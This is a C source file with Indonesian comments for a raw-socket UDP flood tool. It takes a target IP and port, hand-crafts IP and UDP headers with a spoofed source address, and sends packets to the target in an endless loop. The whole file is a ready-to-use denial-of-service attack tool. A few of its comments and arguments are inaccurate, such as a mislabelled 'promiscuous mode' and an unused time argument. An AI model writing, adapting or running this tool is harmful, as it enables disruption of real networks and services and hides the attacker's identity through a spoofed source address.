#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PCKT_LEN 8192

// Struktur untuk header IP
struct ipheader {
    unsigned char iph_ihl :4, iph_ver :4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned char iph_flag;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    unsigned int iph_sourceip;
    unsigned int iph_destip;
};

// Struktur untuk header UDP
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

// Checksum
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

int main(int argc, char *argv[]) {
    int sd;
    char buffer[PCKT_LEN];
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct sockaddr_in sin;
    int one = 1;
    const int *val = &one;

    if (argc != 4) {
        printf("Usage: %s <target IP> <port> <time>\n", argv[0]);
        exit(0);
    }

    // Buat socket raw IP
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0) {
        perror("socket() error");
        exit(0);
    }

    // Aktifkan mode promiscuous
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt() error");
        exit(0);
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);

    // Isi header IP
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 16;
    ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader);
    ip->iph_ident = htons(54321);
    ip->iph_ttl = 64;
    ip->iph_protocol = 17;
    ip->iph_sourceip = inet_addr("192.168.1.1");
    ip->iph_destip = sin.sin_addr.s_addr;

    // Isi header UDP
    udp->udph_srcport = htons(atoi(argv[2]));
    udp->udph_destport = htons(atoi(argv[2]));
    udp->udph_len = htons(sizeof(struct udpheader));
    udp->udph_chksum = 0;

    // Checksum UDP
    udp->udph_chksum = csum((unsigned short *)buffer, sizeof(struct udpheader));

    // Kirim paket
    printf("Starting Flood...\n");
    while(1) {
        if (sendto(sd, buffer, sizeof(struct ipheader) + sizeof(struct udpheader), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto() error");
            exit(0);
        }
    }

    close(sd);
    return 0;
}
